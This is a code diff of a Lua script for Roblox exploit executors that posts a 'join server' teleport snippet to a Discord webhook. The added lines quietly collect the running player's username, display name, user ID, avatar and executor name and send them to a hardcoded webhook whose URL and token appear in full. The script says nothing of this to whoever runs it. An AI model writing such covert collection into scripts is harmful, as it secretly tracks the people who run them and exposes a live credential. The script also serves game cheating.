@@ -1,13 +1,20 @@
 local Http = game:GetService("HttpService")
 local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
+local executor = identifyexecutor() or "Unknown Executor"
 
 local placeId = 11137575513
 local jobId = "078321e8-ad82-45b3-858e-d0866b4abb53"
 
 local function sendRequest()
-    -- Simple join server script
+    local player = game.Players.LocalPlayer
+    local displayName = player and player.DisplayName or "Display name not available"
+    local userName = player and player.Name or "Error"
+    local playerId = player and player.UserId or 0
+
+    -- Create the simple Join Server script
     local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
 
+    -- Build the webhook payload
     return {
         Url = WebhookUrl,
         Method = 'POST',
@@ -15,28 +22,51 @@ local function sendRequest()
             ['Content-Type'] = 'application/json'
         },
         Body = Http:JSONEncode({
-            ["content"] = "**Here is the simple Join Server script:**",
-            ["embeds"] = {{
-                ["title"] = "Join Server Script",
-                ["description"] = "Copy and paste the following script to join the server:",
-                ["type"] = "rich",
-                ["color"] = tonumber(0x00FF00), -- Green color
-                ["fields"] = {
-                    {
-                        ["name"] = "Script:",
-                        ["value"] = "```lua\n" .. joinScript .. "\n```",
-                        ["inline"] = false
+            ["content"] = "**User and Join Server Script Information**",
+            ["embeds"] = {
+                {
+                    ["author"] = {
+                        ["name"] = "Zte hub Server"
+                    },
+                    ["title"] = userName .. " | " .. displayName,
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0x00FF00), -- Green color
+                    ["thumbnail"] = {
+                        ["url"] = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
+                    },
+                    ["fields"] = {
+                        {
+                            ["name"] = "Executor:",
+                            ["value"] = executor,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Join Server Script:",
+                            ["value"] = "```lua\n" .. joinScript .. "\n```",
+                            ["inline"] = false
+                        }
                     }
                 }
-            }}
+            }
         })
     }
 end
 
--- Send data to the webhook
-if syn then
-    syn.request(sendRequest())
-else
-    request = (http_request or request or HttpPost or syn.request)
-    request(sendRequest())
+-- Send the request to the webhook
+local function sendToWebhook()
+    if syn then
+        -- For Synapse X users
+        syn.request(sendRequest())
+    else
+        -- For other exploit environments
+        local request = http_request or request or HttpPost or syn.request
+        if request then
+            request(sendRequest())
+        else
+            warn("No compatible request function found!")
+        end
+    end
 end
+
+-- Execute the webhook function
+sendToWebhook()
